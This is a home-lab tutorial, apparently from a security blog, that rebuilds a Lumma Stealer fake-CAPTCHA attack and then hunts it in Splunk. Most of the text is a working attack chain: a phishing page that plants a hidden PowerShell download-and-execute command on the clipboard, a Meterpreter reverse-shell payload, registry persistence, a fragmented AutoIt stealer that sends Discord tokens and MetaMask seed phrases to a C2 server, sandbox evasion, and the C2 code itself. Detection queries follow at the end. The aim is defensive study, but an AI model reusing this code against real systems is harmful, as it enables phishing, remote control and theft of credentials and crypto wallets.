## Overview of the Lumma Stealer Attack Chain

The Lumma Stealer attack via fake CAPTCHA pages typically follows this infection chain:

1. **Initial Access**: A user visits a compromised or malicious website hosting a fake CAPTCHA page, often through phishing emails, malvertising, or compromised legitimate sites.
2. **Social Engineering**: The fake CAPTCHA page mimics legitimate services (e.g., Google reCAPTCHA) and tricks the user into clicking a “Verify” or “I’m not a robot” button.
3. **Clipboard Manipulation**: Clicking the button copies a malicious PowerShell command to the user’s clipboard, often Base64-encoded.
4. **User Execution**: The user is instructed to paste and execute the command in the Windows Run dialog `Win+R` or a terminal, which triggers the malware download.
5. **Malware Delivery**: The PowerShell script downloads and executes the Lumma Stealer payload, often from a content delivery network (CDN) or a legitimate platform like GitHub.
6. **Payload Execution**: The malware employs techniques like DLL sideloading or process injection to run silently, stealing sensitive data (e.g., credentials, cryptocurrency wallets, browser data).
7. **Data Exfiltration**: The stolen data is sent to a command-and-control (C2) server.

## Home Lab Setup

* **Windows Machine**
* **Kali Linux Machine.**
* **Ubuntu Machine (Splunk)**

I installed Sysmon on the Windows machine, Splunk on the Ubuntu system, and the Splunk Forwarder on the Windows machine to collect and send logs to Splunk.

I have forwarded the Application, Security, PowerShell, and Sysmon logs to Splunk. The Application and Security logs were configured directly within Splunk during the index creation process. However, to send the PowerShell and Sysmon logs, I created a file named `inputs.conf` in the following directory: `C:\Program Files\SplunkUniversalForwarder\etc\apps\SplunkUniversalForwarder\local`, containing the follow configuration:

```ini
[WinEventLog://Microsoft-Windows-PowerShell/Operational]
disabled = false
index = powershell
sourcetype = WinEventLog:PowerShell
renderXml = 0

[WinEventLog://Microsoft-Windows-Sysmon/Operational]
disabled = false
renderXml = true
index= sysmon
source = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
```

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2Fec94odjI3ngRan0sFlNz%2FScreenshot(41).png?alt=media&#x26;token=f6350943-f16b-4c17-8b8c-e5eeada35b60" alt=""><figcaption></figcaption></figure>

Next, we need to restart the Splunk forwarder using the following command.

```bash
& 'C:\Program Files\SplunkUniversalForwarder\bin\splunk.exe' restart
```

Now, we need to simulate additional sensitive data within the **%APPDATA%** directory, which will serve as the target for our exfiltration test.

```powershell
mkdir "$env:APPDATA\Discord\localStorage" -Force
Set-Content -Path "$env:APPDATA\Discord\localStorage\discord_token.txt" -Value "mfa.Hkjdhsjdhskjdhskjdhsjdhskjdhskjdhsjdhskjdhsjdhskjd"
New-Item -Path "$env:APPDATA\MetaMask" -ItemType Directory
Set-Content -Path "$env:APPDATA\MetaMask\seed_phrase.txt" -Value "apple banana cherry dog elephant fox grape house igloo jelly kangaroo lemon"
```

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2Fsh3KcwsP1AYkyfnsnwXA%2FScreenshot(7).png?alt=media&#x26;token=e53243f7-43f0-4162-84a6-e107a444afaf" alt=""><figcaption></figcaption></figure>

## The Attack - Lumma Stealer <a href="#the-attack-golden-ticket-creation-and-usage" id="the-attack-golden-ticket-creation-and-usage"></a>

Let's begin by creating the fake CAPTCHA webpage that will be used in our attack simulation.

```bash
mkdir -p /var/www/html/captcha
nano /var/www/html/captcha/index.html
```

```bash
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Verify You Are Human</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        .captcha-box {
            border: 1px solid #ccc;
            padding: 20px;
            width: 300px;
            margin: auto;
            background-color: #f9f9f9;
        }
        .verify-btn {
            background-color: #4285F4;
            color: white;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }
        .verify-btn:hover {
            background-color: #3367D6;
        }
        #overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 999;
        }
        #recaptchaPopup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
            z-index: 1000;
            width: 350px;
            text-align: left;
        }
        #recaptchaPopup.active, #overlay.active {
            display: block;
        }
        #recaptchaPopup h3 {
            margin-top: 0;
            color: #333;
        }
        #recaptchaPopup p {
            font-size: 14px;
            color: #555;
        }
        #recaptchaPopup button {
            background-color: #4285f4;
            color: white;
            padding: 10px;
            border: none;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }
        #recaptchaPopup button:hover {
            background-color: #357ae8;
        }
    </style>
</head>
<body>
    <div class="captcha-box">
        <h2>Verify You Are Human</h2>
        <p>Please click to verify.</p>
        <button class="verify-btn" onclick="triggerCaptcha()">I'm not a robot</button>
    </div>

    <div id="overlay"></div>
    <div id="recaptchaPopup">
        <h3>reCAPTCHA Verification ID: 2165</h3>
        <p>To verify:</p>
        <p>1. Press Win + R</p>
        <p>2. Press Ctrl + V</p>
        <p>3. Press Enter</p>
        <button onclick="closePopup()">Verify</button>
    </div>

    <script>
        function triggerCaptcha() {
            // Simulate malicious mshta command (replace <kali-ip> with your lab-controlled IP)
            const textToCopy = `powershell -w hidden -ep bypass -c $url='http://192.168.204.152/payload/win15.txt'; iex (iwr $url -UseBasicParsing).Content`;

            // Copy to clipboard and show popup in one action
            const tempTextArea = document.createElement("textarea");
            tempTextArea.value = textToCopy;
            document.body.appendChild(tempTextArea);
            tempTextArea.select();
            try {
                document.execCommand("copy");
                // Show popup and overlay
                document.getElementById("recaptchaPopup").classList.add("active");
                document.getElementById("overlay").classList.add("active");
            } catch (err) {
                alert("Failed to copy command. Please try again.");
            }
            document.body.removeChild(tempTextArea);
        }

        function closePopup() {
            // Hide popup and overlay
            document.getElementById("recaptchaPopup").classList.remove("active");
            document.getElementById("overlay").classList.remove("active");
        }
    </script>
</body>
<html>
```

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2FtmzBIXxjObr4z0kkug03%2FScreenshot.png?alt=media&#x26;token=bfd59f60-b49d-46a2-9097-a8f745252805" alt=""><figcaption></figcaption></figure>

Let's modify the permissions of the Captcha folder to ensure the phishing page is accessible through the web server.

```bash
sudo chown www-data:www-data -R /var/www/html/captcha
sudo chmod 755 -R /var/www/html/captcha
```

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2F7UvpRTZ3Q34bcRjj8vMV%2FScreenshot(11).png?alt=media&#x26;token=427e929e-26ff-41e4-8e01-6d88a36c3f7f" alt=""><figcaption></figcaption></figure>

In the code, clicking the button copies the command to the user's clipboard. Let's verify this behaviour.
	  
<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2FWf0GvVxzuhRmyhA6eBfa%2FScreenshot(1).png?alt=media&#x26;token=7d6b70ef-3e6e-414a-8fb4-13bd2c0f4678" alt=""><figcaption></figcaption></figure>

When the `Win + R` keys were pressed, the command was automatically copied to the clipboard.

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2F8POCeYI0UO22xHZklcJK%2FScreenshot(2).png?alt=media&#x26;token=775dc60b-33fb-413a-a581-aaab27e7711e" alt=""><figcaption></figcaption></figure>

We now need to generate the initial payload using **msfvenom.**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.204.152 LPORT=4444 -f exe -o Set-up.exe
```

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2FLWEKqw8qj3pxIN63ebQl%2FScreenshot(3).png?alt=media&#x26;token=589d9c7a-e461-403d-8b8c-45ac910b6311" alt=""><figcaption></figcaption></figure>

Let's create a new folder named **"payload"** and move **"Set-up.exe"** into this folder.

```bash
mkdir -p /var/www/html/payload
mv Set-up.exe /var/www/html/payload/
```

Next, we will modify the file’s permissions to allow other users to download it via HTTP.

```bash
sudo chown www-data:www-data /var/www/html/payload/Set-up.exe
sudo chmod 644 /var/www/html/payload/Set-up.exe
```

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2F30QLkS2RJkFb9LguPhfZ%2FScreenshot(5).png?alt=media&#x26;token=9076aec9-ca26-422b-ad13-c4d64c6d94fd" alt=""><figcaption></figcaption></figure>

Next, we will package the `Set-up.exe` file into an archive named `win15.zip`.

```bash
mkdir -p /tmp/win15
cp /var/www/html/payload/Set-up.exe /tmp/win15/
cd /tmp/win15
zip /var/www/html/payload/win15.zip Set-up.exe
rm -rf /tmp/win15
```

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2F2mHwzjxFOHMKalyc9W8W%2FScreenshot(8).png?alt=media&#x26;token=a2850f88-ab4a-4add-a306-2b1bb410f85f" alt=""><figcaption></figcaption></figure>

Next, we need to modify its permissions to ensure that Apache can serve the ZIP file.

```bash
sudo chown www-data:www-data /var/www/html/payload/win15.zip
sudo chmod 644 /var/www/html/payload/win15.zip
```

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2Fe5ZHmjiLxiES3Jb5Q2Du%2FScreenshot(9).png?alt=media&#x26;token=919b1654-c95d-4269-8235-765656757549" alt=""><figcaption></figcaption></figure>

While developing the fake CAPTCHA web page, we configure it to copy the following PowerShell command to the victim's clipboard: `powershell -w hidden -ep bypass -c "$url='http://192.168.204.152/payload/win15.txt'; iex (iwr $url -UseBasicParsing).Content"` This command initiates the download and execution of a remote script. Next, we will create the `win15.txt` file, which will be fetched when the victim proceeds with the CAPTCHA verification steps.

```powershell
$zipUrl = "http://192.168.204.152/payload/win15.zip"
$zipDest = "$env:APPDATA\bFylC6zX.zip"
$extractPath = "$env:APPDATA\7oCDTWYu"
Invoke-WebRequest -Uri $zipUrl -OutFile $zipDest
Expand-Archive -Path $zipDest -DestinationPath $extractPath -Force
$setupPath = "$extractPath\Set-up.exe"
if (-not (Test-Path $extractPath)) { New-Item -Path $extractPath -ItemType Directory }
Start-Process -FilePath $setupPath 
Start-BitsTransfer -Source "http://192.168.204.152/payload/hose.cmd" -Destination "$extractPath\Hose.cmd"
Start-Process -FilePath "cmd.exe" -ArgumentList "/c $extractPath\Hose.cmd"
New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "5TQjtTuo" -Value $setupPath -PropertyType String -Force
```

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2FPJJWSOInpnHORfCfghIx%2FScreenshot(10).png?alt=media&#x26;token=0db9b2d7-94d1-4e9f-994d-5a81e21ae959" alt=""><figcaption></figcaption></figure>

**Breakdown**:

* **$zipUrl:** The web address where the ZIP file is hosted on Kali.
* **$zipDest:** Saves the ZIP to a hidden folder in the user’s AppData (`%APPDATA%\bFylC6zX.zip`) to avoid easy detection.
* **$extractPath:** Sets the extraction location to `%APPDATA%\7oCDTWYu`, another hidden folder.
* **Invoke-WebRequest:** Downloads the ZIP file from Kali.
* **Expand-Archive:** Unzips `Set-up.exe` to the extraction path.
* **if (-not (Test-Path $extractPath)):** Checks if the extraction directory exists; if not, creates it.
* **Start-Process -FilePath $setupPath:** Runs `Set-up.exe` to establish the reverse shell.
* **Start-BitsTransfer:** Downloads the next script (`Hose.cmd`) to continue the attack.
* **Start-Process -FilePath "cmd.exe":** Executes `Hose.cmd` using the Command Prompt.
* **New-ItemProperty:** Adds a registry key to make `Set-up.exe` run every time the computer starts (persistence).

This script mimics a phishing attack where the victim runs a downloaded file, triggering the malware chain.

Next, let's modify the permissions of this file.

```bash
sudo chown www-data:www-data /var/www/html/payload/win15.txt
sudo chmod 644 /var/www/html/payload/win15.txt
```

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2FLyIH6StTg87VR6gUCGQ8%2FScreenshot(12).png?alt=media&#x26;token=2b705624-9001-48ad-9b59-46b564905da5" alt=""><figcaption></figcaption></figure>

Next, we need to generate the AutoIt script fragments (suggests.a3x).

We will develop segmented fragments of an AutoIt script designed to exfiltrate data to a Command and Control (C2) server. When executed on a victim's system, the script will harvest Discord tokens and MetaMask seed phrases. By dividing the script into smaller fragments, we aim to reduce the likelihood of detection.

```bash
echo "#NoTrayIcon" | sudo tee /var/www/html/payload/Italy
echo "#include <File.au3>" | sudo tee -a /var/www/html/payload/Italy
echo "#include <Inet.au3>" | sudo tee /var/www/html/payload/Holmes
echo "Local \$sData = ''" | sudo tee /var/www/html/payload/True
echo "Local \$sFile = @AppDataDir & '\Discord\localStorage\discord_token.txt'" | sudo tee /var/www/html/payload/Lying
echo "If FileExists(\$sFile) Then \$sData &= FileRead(\$sFile) & @CRLF" | sudo tee /var/www/html/payload/Responded
echo "Local \$sFile = @AppDataDir & '\MetaMask\seed_phrase.txt'" | sudo tee /var/www/html/payload/Proc
echo "If FileExists(\$sFile) Then \$sData &= FileRead(\$sFile) & @CRLF" | sudo tee /var/www/html/payload/Fa
echo -E "InetGet('http://192.168.204.152:8080/c2?data=' & \$sData, @TempDir & '\exfil_data.txt', 1)" | sudo tee /var/www/html/payload/Ink
```

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2FLr37jKFoue492m9tiZ6o%2FScreenshot(13).png?alt=media&#x26;token=155b0a54-1da5-4722-80d3-fbff04a0b071" alt=""><figcaption></figcaption></figure>

**Explanation:**

* **#NoTrayIcon:** hides the script’s icon from the system tray.
* **#include \<File.au3>:** adds the AutoIt file handling library. We need this library to read files on the victim machine.
* **#include \<Inet.au3>:** adds the internet library for sending data. This library enables the `InetGet` command to exfiltrate data.
* **Local $sData = '' :** declares a variable to store the stolen data, initialized as an empty string.
* **Local $sFile:** sets a variable to the path where Discord tokens might be stored. **@AppDataDir** is an AutoIt macro for the user’s AppData folder (e.g., C:\Users\jody\AppData\Roaming).
* **InetGet:** sends an HTTP GET request to the C2 server with the data, saving the response to `%TEMP%\exfil_data.txt`. The 1 flag forces an overwrite if the file exists.

To collect these fragments, we will create a file named `hose.cmd` that concatenates them. On the victim machine, this will produce the following result:

```autoit
#NoTrayIcon
#include <File.au3>
#include <Inet.au3>
Local $sData = ''
Local $sFile = @AppDataDir & '\Discord\localStorage\discord_token.txt'
If FileExists($sFile) Then $sData &= FileRead($sFile) & @CRLF
Local $sFile = @AppDataDir & '\MetaMask\seed_phrase.txt'
If FileExists($sFile) Then $sData &= FileRead($sFile) & @CRLF
InetGet('http://192.168.204.152:8080/c2?data=' & $sData, @TempDir & '\exfil_data.txt', 1)
```

This script checks for the specified files, collects their content, and sends it to the C2 server.

Let's also modify their permissions.

```bash
sudo chown www-data:www-data /var/www/html/payload/{Italy,Holmes,True,Lying,Responded,Proc,Fa,Ink}
sudo chmod 644 /var/www/html/payload/{Italy,Holmes,True,Lying,Responded,Proc,Fa,Ink}
```

To clarify the scenario, the process should be as follows.

The victim clicks on the CAPTCHA verification button, which triggers the copying of a malicious command to their clipboard. Following the instructions, the victim presses `Win + R` and hits Enter, causing the commands listed in the `win15.txt` file to execute sequentially.

At this stage, we need to create the `hose.cmd` script to aggregate these fragments into a file named `suggests.a3x`, allowing us to retrieve the target files and transmit them to our Command and Control (C2) server.

```bash
nano /var/www/html/payload/hose.cmd
```

```visual-basic
@echo off
tasklist | findstr /I "wrsa opssvc" & if not errorlevel 1 ping -n 198 127.0.0.1
Set /a Realtor=195402
mkdir %TEMP%\195402
cd %TEMP%\195402

:: Check if AutoIt3_x64.exe exists, if not download it
if not exist "C:\Program Files (x86)\AutoIt3\AutoIt3_x64.exe" (
    powershell -Command "Invoke-WebRequest -Uri 'http://192.168.204.152/payload/AutoIt3_x64.exe' -OutFile 'AutoIt3_x64.exe'"
)

:: Set the AutoIt3 executable path
Set AUTOIT_PATH=%CD%\AutoIt3_x64.exe

:: Download payload fragments to evade detection
powershell -Command "Invoke-WebRequest -Uri 'http://192.168.204.152/payload/Italy' -OutFile '..\Italy'"
powershell -Command "Invoke-WebRequest -Uri 'http://192.168.204.152/payload/Holmes' -OutFile '..\Holmes'"
powershell -Command "Invoke-WebRequest -Uri 'http://192.168.204.152/payload/True' -OutFile '..\True'"
powershell -Command "Invoke-WebRequest -Uri 'http://192.168.204.152/payload/Lying' -OutFile '..\Lying'"
powershell -Command "Invoke-WebRequest -Uri 'http://192.168.204.152/payload/Responded' -OutFile '..\Responded'"
powershell -Command "Invoke-WebRequest -Uri 'http://192.168.204.152/payload/Proc' -OutFile '..\Proc'"
powershell -Command "Invoke-WebRequest -Uri 'http://192.168.204.152/payload/Fa' -OutFile '..\Fa'"
powershell -Command "Invoke-WebRequest -Uri 'http://192.168.204.152/payload/Ink' -OutFile '..\Ink'"

:: Concatenate all payload components to create the final a3x file
cmd /c copy /b ..\Italy + ..\Holmes + ..\True + ..\Lying + ..\Responded + ..\Proc + ..\Fa + ..\Ink suggests.a3x

:: Execute the final payload
if exist "%AUTOIT_PATH%" (
    "%AUTOIT_PATH%" suggests.a3x
) else (
    "C:\Program Files (x86)\AutoIt3\AutoIt3_x64.exe" suggests.a3x
)

:: Wait before exit
choice /d y /t 5
```

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2F3sKtIurcX41iHJkFRjDK%2FScreenshot(14).png?alt=media&#x26;token=a7d5333a-8aed-4c47-ad57-680dfa3db463" alt=""><figcaption></figcaption></figure>

**Explanation:**&#x20;

* **tasklist | findstr /I "wrsa opssvc" & if not errorlevel 1 ping -n 198 127.0.0.1:** The script checks for the presence of security software by using the `tasklist` command. If any such software is detected, it delays execution by issuing a `ping -n 198 localhost` command, causing the system to ping itself 198 times. This technique is intended to evade sandbox analysis, as sandboxes often terminate execution before the delay completes.
* **Set /a Realtor=195402:** Sets a random variable.
* **mkdir %TEMP%\195402 and cd %TEMP%\195402:** Creates and moves to a temporary folder named 195402 in the system's temp directory.
* **if not exist "C:\Program Files (x86)\AutoIt3\AutoIt3\_x64.exe" (...):** Checks if the AutoIt executable exists; if not, downloads it from `http://192.168.204.152/payload/AutoIt3_x64.exe`.
* **Set AUTOIT\_PATH=%CD%\AutoIt3\_x64.exe:** Sets the path to the downloaded or existing AutoIt executable.
* **cmd /c copy /b ..\Italy + ..\Holmes + ... suggests.a3x:** Combines the downloaded pieces into a single file called **`suggests.a3x`**.
* **if exist "%AUTOIT\_PATH%" (...) else (...):** Runs suggests.a3x using the downloaded AutoIt or the default installed version.
* **choice /d y /t 5:** Pauses the script for 5 seconds before exiting.

This script is a malware delivery tool that downloads and assembles a malicious AutoIt script `suggests.a3x` on the victim's computer, then runs it to steal data like Discord tokens or MetaMask seed phrases, sending it to a remote server while trying to avoid detection by security software.

You can download **`AutoIt3_x64.exe`** from the official website using the following link:\
<https://www.autoitscript.com/site/autoit/downloads/>

Next, let's update the permissions for the `hose.cmd` file.

```bash
sudo chown www-data:www-data /var/www/html/payload/hose.cmd
sudo chmod 644 /var/www/html/payload/hose.cmd
```

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2FkxBGXvyFyc1BUbC69ubi%2FScreenshot(15).png?alt=media&#x26;token=a0d494cd-06f2-4b9e-87d5-ea398a4bb584" alt=""><figcaption></figcaption></figure>

We now need to develop a Python-based Command and Control (C2) server to receive the exfiltrated data.

```bash
nano /var/www/html/c2.py
```

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

class C2Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        query = urllib.parse.urlparse(self.path).query
        params = urllib.parse.parse_qs(query)
        data = params.get('data', ['No data'])[0]
        with open('/var/www/html/c2_data.txt', 'a') as f:
            f.write(f"[C2 GET {self.log_date_time_string()}] {data}\n")
        self.send_response(200)
        self.end_headers()

server = HTTPServer(('', 8080), C2Handler)
print("C2 Server Started on port 8080")
server.serve_forever()
```

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2FWWlkUgVusdP45z5dUGOH%2FScreenshot(16).png?alt=media&#x26;token=a4566240-0323-4259-908d-c7135872fbda" alt=""><figcaption></figcaption></figure>

Let's start the C2 server and configure the appropriate permissions for the `c2_data.txt` file.

```bash
sudo python3 /var/www/html/c2.py
sudo chown www-data:www-data /var/www/html/c2_data.txt
sudo chmod 644 /var/www/html/c2_data.txt
```

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2FzUYl0h5Nz5rOkedQ6iSe%2FScreenshot(18).png?alt=media&#x26;token=a71ba3f1-596e-45c1-bef7-27357cb582b5" alt=""><figcaption></figcaption></figure>

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2FciGnPCcOKPMAlHB5cAgU%2FScreenshot(17).png?alt=media&#x26;token=ef8577d8-3af2-4ac0-a59e-e3b643b431c2" alt=""><figcaption></figcaption></figure>

Before launching the attack, let's first start a listener to capture the reverse shell from **Set-up.exe**.

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.204.152
set LPORT 4444
exploit
```

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2FSM5hIBaOPng22lSSuGiB%2FScreenshot(19).png?alt=media&#x26;token=1f96da04-c543-4ffb-9ca0-5da2b2ae12b2" alt=""><figcaption></figcaption></figure>

Everything is now properly configured; let's proceed with the attack simulation to verify its effectiveness.

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2FdZIGIXQdaK2N1CZIMvZo%2FScreenshot(21).png?alt=media&#x26;token=e88a34de-fba5-4551-aa55-b74d0582ce6f" alt=""><figcaption></figcaption></figure>

Let's now verify whether we received a reverse shell and if any data exfiltration occurred.

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2FpN93Orhvjn9W246JgbSj%2FScreenshot(22).png?alt=media&#x26;token=50ba10ec-3dc5-4d21-b317-63b730c8fcde" alt=""><figcaption></figcaption></figure>

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2FyTZzFr5hYzv8vod4v4Pa%2FScreenshot(23).png?alt=media&#x26;token=e15a4740-500b-4abb-9ab3-933fddcded5e" alt=""><figcaption></figcaption></figure>

The attack appears to have been successful; let's now verify whether the registry key was also added.

```powershell
Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "5TQjtTuo"
```

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2FGYSFBVkY6N8UCZe8ujdN%2FScreenshot(24).png?alt=media&#x26;token=c6e20213-c6ab-4059-a9a6-b692b086d6f3" alt=""><figcaption></figcaption></figure>

## Investigation & Detection

The attack begins with a file download, so let's filter by Event Code 4104 to examine the executed PowerShell commands.

```splunk-spl
index=powershell EventCode=4104
| eval Message=lower(Message)
| where 
    Message LIKE "%-e%" OR 
    Message LIKE "%-enc%" OR 
    Message LIKE "%-encodedcommand%" OR 
    Message LIKE "%invoke-webrequest%" OR 
    Message LIKE "%downloadstring%" OR 
    Message LIKE "%start-process%" OR 
    Message LIKE "%get-clipboard%" OR 
    Message LIKE "%hidden%" OR 
    Message LIKE "%bitlockertogo%" OR
    Message LIKE "%bitstransfer%" OR
    Message LIKE "%iwr%" OR
    Message LIKE "%iex%"
| eval base64_pattern=if(match(Message, "[a-zA-Z0-9+/]{44,}([a-zA-Z0-9+/]{4}|[a-zA-Z0-9+/]{3}=|[a-zA-Z0-9+/]{2}==)"), "Possible Base64", "None")
| eval suspicious_cmdlet=if(match(Message, "(invoke-webrequest|iwr|downloadstring|enc|encodedcommand|hidden|bitstransfer|start-process|get-clipboard)"), "Suspicious Cmdlet", "None")
| stats count by _time, host, Message, base64_pattern, suspicious_cmdlet
| where suspicious_cmdlet="Suspicious Cmdlet"
| table _time, Message, base64_pattern, suspicious_cmdlet, count
```

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2FP5woEHf0nb7BFVZItmUJ%2FScreenshot(25).png?alt=media&#x26;token=ab1684a3-ff2b-4e89-ba37-fc485a8a225e" alt=""><figcaption></figcaption></figure>

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2F29QqKO1yvfGwlPagpEY0%2FScreenshot(28).png?alt=media&#x26;token=c7b3aae2-90d8-4d8d-a5e0-3d08c426519e" alt=""><figcaption></figcaption></figure>

* The attacker first downloaded a file named `win15.txt`, which contained a list of commands to be executed sequentially.
* A ZIP file was downloaded from the remote IP address `192.168.204.152` and saved to the path:\
  `$env:APPDATA\bfylc6zx.zip`.
* The ZIP file was extracted to a randomly named folder:\
  `$env:APPDATA\7ocdtwyu`.
* Within the extracted contents, a file named `Set-up.exe` was found and executed.
* Another file, `hose.cmd`, was placed in the same extracted folder and subsequently executed.
* To maintain persistence, a registry key named `5tqjttuo` (randomly generated) was created, with its value set to the path of `Set-up.exe`.

Let's review the network logs to determine if any outbound connections were initiated following the execution of `Set-up.exe`.

```splunk-spl
index=sysmon EventCode=3 *Set-up.exe*
| table _time, process_name, SourceIp, SourcePort, DestinationIp, DestinationPort
```

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2FU2usduHGT1CFOjEkU6cy%2FScreenshot(29).png?alt=media&#x26;token=e0a67e0c-fe4c-45b7-b3b7-b8819162629d" alt=""><figcaption></figcaption></figure>

Following the execution of `Set-up.exe`, the attacker successfully established a reverse shell connection on port 4444.

Next, let's filter for the file named **`hose.cmd`** to examine its contents.

```splunk-spl
index="sysmon" EventCode=1 parent_process=*hose.cmd* 
| table _time, CommandLine
```

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2FyXqenByGs2N4ERquYaqu%2FScreenshot(31).png?alt=media&#x26;token=40c5c245-f36a-4f8d-bae0-165fc562abd5" alt=""><figcaption></figcaption></figure>

In this case, it was observed that the `hose.cmd` file was used to download file fragments, which the attacker subsequently combined to create the file `suggests.a3x`, which is an AutoIt script, a scripting language primarily used for automating Windows GUI tasks and developing Windows-based applications.

```splunk-spl
index="wineventlog" EventCode=4688 *suggests.a3x*
| table _time, Process_Command_Line
```

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2FD0sRrzFJVXcFpZ8DVRuz%2FScreenshot(32).png?alt=media&#x26;token=91653b42-6381-46d1-b011-e4ca7c9f553d" alt=""><figcaption></figcaption></figure>

The attacker then executed the AutoIt **`suggests.a3x`** script using **`AutoIt_x64.exe`**.

```splunk-spl
index=sysmon EventCode=3 DestinationIp=192.168.204.152
| table _time, process_name, SourceIp, DestinationIp, DestinationPort
| sort _time
```

<figure><img src="https://2537271824-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIswWWP3l0rGuQmG2WUcr%2Fuploads%2FnQd3jwRwlvkM93aXjlHH%2FScreenshot(33).png?alt=media&#x26;token=b51465bc-60b5-4975-960e-28de59e730ef" alt=""><figcaption></figcaption></figure>

By analyzing the network connections to the attacker's IP, we observe that within just 15 seconds, the attacker downloaded an initial file containing execution commands and established a reverse shell on port 4444. Subsequently, they downloaded several file fragments used to assemble the AutoIt script that was executed. An additional connection was then made to the attacker's server on port 8080, likely for data exfiltration.

We can create a detection rule based on the initial query and configure it to run every 15 minutes. Let's proceed with this approach.

